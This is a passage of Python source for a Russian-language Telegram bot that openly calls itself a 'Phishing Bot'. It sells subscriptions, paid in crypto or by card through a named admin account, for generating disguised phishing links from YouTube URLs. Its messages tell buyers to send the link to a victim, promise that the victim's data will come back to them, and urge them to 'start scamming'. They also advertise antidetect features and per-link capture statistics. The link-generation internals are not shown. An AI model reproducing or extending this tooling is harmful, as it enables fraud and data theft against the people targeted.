        subscription_names = {
            'basic': '🎯 БАЗОВЫЙ ДОСТУП',
            'pro': '🚀 PRO ДОСТУП',
            'premium': '🏆 PREMIUM ДОСТУП'
        }
        
        text = format_message(f"""
{subscription_names[subscription_type]}

💰 ЦЕНА: {price} ₽
🔗 ФИШИНГ-ССЫЛОК: {limits['links']}
⏱ СРОК: {limits['lifetime']} ДНЕЙ
⏳ ЖИВУЧЕСТЬ ССЫЛОК: {limits['link_lifetime']}

✨ ВКЛЮЧЕНО:
""", bold_all=True)
        
        for feature in limits['features']:
            text += format_message(f"• {feature}\n", bold_all=True)
        
        text += format_message("""
👇 ВЫБИРАЙ СПОСОБ ОПЛАТЫ:
""", bold_all=True)
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                             text, get_subscription_details_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_crypto_'))
async def buy_subscription_crypto(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('buy_crypto_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        user_id = callback_query.from_user.id
        
        await callback_query.answer("Создаем счёт...")
        
        description = f"Оплата {subscription_type} подписки Phishing Bot"
        pay_url, invoice_id = await create_crypto_invoice(price, description)
        
        if pay_url and invoice_id:
            pending_payments[user_id] = {
                'type': 'subscription',
                'subscription_type': subscription_type,
                'invoice_id': invoice_id,
                'amount': price,
                'payment_method': 'crypto'
            }
            
            invoice_text = format_message(f"""
✅ СЧЕТ СОЗДАН

💰 Сумма: {price} ₽
💎 Подписка: {subscription_type.upper()}
⏱ Действует: 60 минут

🎯 КАК ВСЁ РАБОТАЕТ:

1. Оплачиваешь счёт в CryptoBot
2. Ждёшь 1-3 минуты
3. Нажимаешь "ПРОВЕРИТЬ ОПЛАТУ"
4. Бот АВТОМАТОМ открывает доступ
5. Начинаешь работать

⚠️ ВСЁ ЧЕСТНО:
• Никаких "кидалово"
• Доступ открывается АВТОМАТИЧЕСКИ
• Мы НЕ обманываем - инструмент рабочий
• Проверь на самом дешёвом тарифе

🔒 Оплата через CryptoBot:
• USDT • TON • BTC
• ETH • LTC • BNB
""", bold_all=True)
            
            markup = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="💳 ОПЛАТИТЬ", url=pay_url)],
                    [InlineKeyboardButton(text="🔄 ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"check_payment_{invoice_id}")],
                    [InlineKeyboardButton(text="🔙 НАЗАД", callback_data=f"subscription_{subscription_type}")]
                ]
            )
            
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo8.png", invoice_text, markup)
            
        else:
            await callback_query.answer("Ошибка при создании счета", show_alert=True)
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('buy_card_'))
async def buy_subscription_card(callback_query: types.CallbackQuery):
    """Обработчик покупки подписки картой через администратора"""
    subscription_type = callback_query.data.replace('buy_card_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        
        card_text = format_message(f"""
💳 ОПЛАТА КАРТОЙ (ЧЕРЕЗ АДМИНА)

💰 Сумма: {price} ₽
💎 Подписка: {subscription_type.upper()}

📋 ИНСТРУКЦИЯ:

1. Нажми кнопку "Написать админу" ниже
2. Напиши администратору:
   - Тип подписки: {subscription_type.upper()}
   - Сумма: {price} ₽
   - Твой ID: {callback_query.from_user.id}

3. Админ отправит реквизиты карты
4. Ты делаешь перевод
5. Отправляешь скриншот чека админу
6. Админ вручную активирует подписку

⏱ Время активации: 5-15 минут после оплаты

⚠️ ВАЖНО:
• Реквизиты карты НЕ хранятся в боте
• Все платежи вручную
• Сохраняй скриншот чека
• Комиссия за перевод: 5%

👨‍💻 Администратор: @htttpspubg
""", bold_all=True)
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                            card_text, get_admin_payment_keyboard(subscription_type))
    
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('check_payment_'))
async def check_payment(callback_query: types.CallbackQuery):
    invoice_id = callback_query.data.replace('check_payment_', '')
    user_id = callback_query.from_user.id
    
    if user_id in pending_payments and pending_payments[user_id]['invoice_id'] == invoice_id:
        is_paid = await check_crypto_payment(invoice_id)
        
        if is_paid:
            payment = pending_payments[user_id]
            
            if payment['type'] == 'balance':
                amount = payment['amount']
                user_balances[user_id] = user_balances.get(user_id, 0) + amount
                
                user_data = get_user_data(user_id)
                user_data['total_spent'] += amount
                
                success_text = format_message(f"""
✅ БАЛАНС ПОПОЛНЕН!

💰 +{amount} ₽ на счёт
📅 {datetime.datetime.now().strftime("%d.%m.%Y %H:%M")}

🎯 Новый баланс: {user_balances[user_id]} ₽
🔒 Средства уже на твоём счёте

👇 Теперь можешь купить подписку:
""", bold_all=True)
                
                del pending_payments[user_id]
                
                markup = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="💎 КУПИТЬ ПОДПИСКУ", callback_data="show_subscriptions")],
                        [InlineKeyboardButton(text="👤 В КАБИНЕТ", callback_data="back_to_profile")]
                    ]
                )
                
                await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                                    success_text, markup)
                await callback_query.answer("✅ Деньги зачислены!", show_alert=True)
                
            elif payment['type'] == 'subscription':
                # Активируем подписку
                subscription_type = pending_payments[user_id]['subscription_type']
                lifetime = SUBSCRIPTION_LIMITS[subscription_type]['lifetime']
                expiry_date = (datetime.datetime.now() + datetime.timedelta(days=lifetime)).strftime("%Y-%m-%d")
                
                # Активируем подписку
                user_subscriptions[user_id] = {
                    'type': subscription_type,
                    'expiry': expiry_date,
                    'links_used': 0,
                    'links_limit': SUBSCRIPTION_LIMITS[subscription_type]['links']
                }
                
                # Обновляем данные пользователя
                user_data = get_user_data(user_id)
                user_data['purchases_count'] += 1
                user_data['total_spent'] += SUBSCRIPTION_PRICES[subscription_type]
                
                # Удаляем из ожидающих платежей
                del pending_payments[user_id]
                
                success_text = format_message(f"""
✅ ПОДПИСКА АКТИВИРОВАНА!

💎 Тариф: {subscription_type.upper()}
⏱ Действует до: {expiry_date}
🔗 ФИШИНГ-ССЫЛОК: {SUBSCRIPTION_LIMITS[subscription_type]['links']}
⏳ Живучесть: {SUBSCRIPTION_LIMITS[subscription_type]['link_lifetime']}

🎯 ВСЁ РАБОТАЕТ АВТОМАТОМ:
1. Оплата прошла → доступ открылся
2. Никаких обманов
3. Всё честно и прозрачно

⚡ НАЧИНАЙ СКАМИТЬ ПРЯМО СЕЙЧАС:
""", bold_all=True)
                
                markup = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="🎬 СОЗДАТЬ ССЫЛКУ", callback_data="generate_link")],
                        [InlineKeyboardButton(text="👤 В КАБИНЕТ", callback_data="back_to_profile")]
                    ]
                )
                
                await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                          "photo1.png", success_text, markup)
                
                await callback_query.answer("✅ Подписка активирована! Начинай работать.", show_alert=True)
        else:
            await callback_query.answer("❌ Оплата не найдена. Если оплатил - подожди 1-2 минуты.", show_alert=True)
    else:
        await callback_query.answer("❌ Счет не найден. Создай новый.", show_alert=True)

@dp.callback_query(lambda callback_query: callback_query.data == 'generate_link')
async def generate_link(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    
    # Проверяем активную подписку
    subscription_info = get_subscription_info(user_id)
    
    if not subscription_info:
        text = format_message("""
❌ ДОСТУП ЗАБЛОКИРОВАН

Для генерации фишинг-ссылок нужна подписка.

👇 Выбирай тариф:
""", bold_all=True)
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                             text, get_subscriptions_keyboard())
        await callback_query.answer()
        return
    
    await dp.fsm.set_state(user_id, UserStates.waiting_for_youtube_url)
    
    text = format_message(f"""
🎬 ГЕНЕРАЦИЯ ФИШИНГ-ССЫЛКИ

💎 Твой тариф: {subscription_info['type'].upper()}
🔗 Использовано: {subscription_info['links_used']}/{subscription_info['links_limit']}
⏱ Осталось дней: {subscription_info['days_left']}
⏳ Живучесть ссылок: {SUBSCRIPTION_LIMITS[subscription_info['type']]['link_lifetime']}

📌 КИДАЙ ССЫЛКУ НА YouTube ВИДЕО:

Примеры:
• https://youtube.com/watch?v=ID
• https://youtu.be/ID
• https://www.youtube.com/embed/ID

💡 Пример реальной ссылки:
https://youtu.be/rVHGiFCuL-w
""", bold_all=True)
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id,
                         text, get_back_keyboard())
    await callback_query.answer()

@dp.message(UserStates.waiting_for_youtube_url)
async def process_youtube_url(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    youtube_url = message.text.strip()
    
    await state.clear()
    
    if "youtube.com" in youtube_url or "youtu.be" in youtube_url:
        phishing_link, error = generate_phishing_link(youtube_url, user_id)
        
        if error:
            await message.answer(error, parse_mode='HTML')
            
            if "лимит" in error.lower():
                markup = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="💎 КУПИТЬ БОЛЬШЕ", callback_data="show_subscriptions")]
                    ]
                )
                await message.answer("Хочешь больше ссылок?", reply_markup=markup, parse_mode='HTML')
            return
        
        user_data = get_user_data(user_id)
        user_data['total_links'] = user_data.get('total_links', 0) + 1
        
        subscription_info = get_subscription_info(user_id)
        
        response_text = format_message(f"""
✅ ФИШИНГ-ССЫЛКА ГОТОВА!

🔗 ОРИГИНАЛ: {youtube_url[:40]}...
🎯 ФИШИНГ: {phishing_link}

📊 ТВОЯ СТАТИСТИКА:
├ 💎 ТАРИФ: {subscription_info['type'].upper()}
├ 🔗 ИСПОЛЬЗОВАНО: {subscription_info['links_used']}/{subscription_info['links_limit']}
├ ⏱ ОСТАЛОСЬ ДНЕЙ: {subscription_info['days_left']}
└ ⚡ АНТИДЕТЕКТ: АКТИВЕН

📌 КИДАЙ ЭТУ ССЫЛКУ ЛОХУ
✅ ДАННЫЕ ПРИДУТ СЮДА

⚠️ НЕ КИДАЙ СЕБЕ - СОСЕТ ДАННЫЕ
""", bold_all=True)
        
        await message.answer(response_text, parse_mode='HTML')
        
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🔄 ЕЩЁ ССЫЛКУ", callback_data="generate_link")],
                [InlineKeyboardButton(text="📊 МОИ ССЫЛКИ", callback_data="my_phishing_links")]
            ]
        )
        
        await message.answer("Сгенерить ещё?", reply_markup=markup, parse_mode='HTML')
        
    else:
        await message.answer(format_message("""
❌ ЭТО НЕ YouTube ССЫЛКА

Кидай нормальную ссылку на ютуб.

Пример: https://youtu.be/rVHGiFCuL-w
""", bold_all=True), parse_mode='HTML')

# --- ОСТАЛЬНЫЕ ОБРАБОТЧИКИ ---

@dp.callback_query(lambda callback_query: callback_query.data == 'my_phishing_links')
async def my_phishing_links(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    links = user_generated_links.get(user_id, [])
    
    if links:
        links_text = format_message("🔗 ТВОИ ФИШИНГ-ССЫЛКИ\n\n", bold_all=True)
        for i, link in enumerate(links[-10:], 1):  # Последние 10 ссылок
            links_text += format_message(f"""
#{i} | {link['timestamp']}
├ 🎬 Оригинал: {link['original'][:50]}...
├ 🎯 Фишинг: {link['phishing']}
├ 👁️ Переходы: {link['clicks']}
└ 📊 Данных: {len(link['data_captured'])} записей
""", bold_all=True)
    else:
        links_text = format_message("""
🔗 ТВОИ ФИШИНГ-ССЫЛКИ

У тебя пока нет созданных фишинг-ссылок.

🎯 Как создать первую ссылку:
1. Нажми "Сгенерировать ссылку"
2. Кидай YouTube ссылку
3. Получай фишинг-ссылку
4. Кидай лоху
5. Получай данные!
""", bold_all=True)
    
    links_text += format_message(f"\n📊 Всего ссылок: {len(links)}", bold_all=True)
    
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔄 НОВАЯ ССЫЛКА", callback_data="generate_link"),
                InlineKeyboardButton(text="🔙 НАЗАД", callback_data="back_to_profile")
            ]
        ]
    )
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
                         links_text, markup)
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'top_up_balance')
async def top_up_balance(callback_query: types.CallbackQuery):
    await dp.fsm.set_state(callback_query.from_user.id, UserStates.waiting_for_amount)
    text = format_message("""
💳 ПОПОЛНЕНИЕ БАЛАНСА

Введи сумму пополнения (от 500 до 100000 ₽):

⚠️ Минимальная сумма: 500 ₽
Пополнение доступно только через CryptoBot
""", bold_all=True)
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
                         text)
    await callback_query.answer()

@dp.message(UserStates.waiting_for_amount)
async def process_top_up_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 500:
            await message.answer(format_message("❌ Минимальная сумма пополнения: 500 ₽", bold_all=True))
            return
        elif amount > 100000:
            await message.answer(format_message("❌ Максимальная сумма пополнения: 100000 ₽", bold_all=True))
            return
            
        await state.clear()
        
        # Сохраняем сумму для пользователя
        user_id = message.from_user.id
        user_data = get_user_data(user_id)
        user_data['pending_amount'] = amount
        
        text = format_message(f"""
✅ СУММА ПОДТВЕРЖДЕНА

💰 Сумма пополнения: {amount:.0f} ₽

👇 Выбирай способ оплаты:
Доступен только CryptoBot
""", bold_all=True)
        
        await message.answer(text, reply_markup=get_payment_methods_keyboard(), parse_mode='HTML')
        
    except ValueError:
        await message.answer(format_message("❌ Кидай только цифры", bold_all=True))

@dp.callback_query(lambda callback_query: callback_query.data == 'payment_card')
async def process_payment_card(callback_query: types.CallbackQuery):
    """Обработчик выбора оплаты картой"""
    await callback_query.answer("💳 Оплата картой через администратора")
    
    text = format_message(f"""
💳 ОПЛАТА КАРТОЙ (ЧЕРЕЗ АДМИНА)

📋 ИНСТРУКЦИЯ:

1. Нажми кнопку "Написать админу" ниже
2. Напиши администратору:
   - Сумму пополнения
   - Твой ID: {callback_query.from_user.id}

3. Админ отправит реквизиты карты
4. Ты делаешь перевод
5. Отправляешь скриншот чека админу
6. Админ вручную пополняет баланс

⏱ Время пополнения: 5-15 минут после оплаты

⚠️ ВАЖНО:
• Реквизиты карты НЕ хранятся в боте
• Все платежи вручную
• Сохраняй скриншот чека
• Комиссия за перевод: 5%

👨‍💻 Администратор: @htttpspubg
""", bold_all=True)
    
    markup = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 НАПИСАТЬ АДМИНУ", url="https://t.me/htttpspubg")],
            [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="top_up_balance")]
        ]
    )
    
    await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
                         text, markup)

@dp.callback_query(lambda callback_query: callback_query.data == 'payment_crypto')
async def process_payment_crypto(callback_query: types.CallbackQuery):
    """Обработчик оплаты через CryptoBot"""
    user_id = callback_query.from_user.id
    
    # Проверяем, была ли уже введена сумма
    user_data = get_user_data(user_id)
    amount = user_data.get('pending_amount', 500)
    
    await callback_query.answer("Создаем счет для оплаты...")
    
    description = f"Пополнение баланса на {amount} ₽"
    pay_url, invoice_id = await create_crypto_invoice(amount, description)
    
    if pay_url and invoice_id:
        # Сохраняем информацию о платеже
        pending_payments[user_id] = {
            'type': 'balance',
            'invoice_id': invoice_id,
            'amount': amount,
            'payment_method': 'crypto'
        }
        
        invoice_text = format_message(f"""
💰 СЧЕТ ДЛЯ ОПЛАТЫ

Сумма: {amount} ₽
Способ: CryptoBot
Действует: 60 минут

🔒 Безопасная оплата:
• USDT (TRC20/ERC20)
• TON
• BTC
• ETH
• LTC
• BNB

Баланс обновится автоматически после оплаты.
""", bold_all=True)
        
        markup = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="💳 ОПЛАТИТЬ", url=pay_url)],
                [InlineKeyboardButton(text="🔄 ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"check_payment_{invoice_id}")],
                [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="top_up_balance")]
            ]
        )
        
        await delete_and_send(callback_query.message.chat.id, callback_query.message.message_id, 
                            invoice_text, markup)
    else:
        await callback_query.answer("Ошибка при создании счета", show_alert=True)

# --- ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОМАНД ---

@dp.message()
async def handle_unknown(message: types.Message):
    unknown_text = format_message("""
⚠️ КОМАНДА НЕ РАСПОЗНАНА

Пользуйся кнопками меню или командами:

🏠 Основные команды:
/start - Главное меню
/profile - Личный кабинет
/balance - Мой баланс
/subscriptions - Подписки
/support - Техподдержка

💡 Или выбери раздел в меню ниже:
""", bold_all=True)
    await message.answer(unknown_text, reply_markup=get_main_keyboard(), parse_mode='HTML')

async def main():
    """Основная функция запуска бота"""
    # Проверяем существование необходимых файлов изображений
    required_images = ['photo1.png', 'photo2.png', 'photo3.png', 'photo4.png', 
                      'photo5.png', 'photo6.png', 'photo7.png', 'photo8.png',
                      'photo9.png', 'photo10.png']
    
    logging.info("Проверка наличия файлов изображений...")
    for img in required_images:
        img_path = get_image_path(img)
        if os.path.exists(img_path):
            logging.info(f"✓ Файл {img} найден: {img_path}")
        else:
            logging.warning(f"✗ Файл {img} не найден: {img_path}")
    
    logging.info("Phishing Bot запущен...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())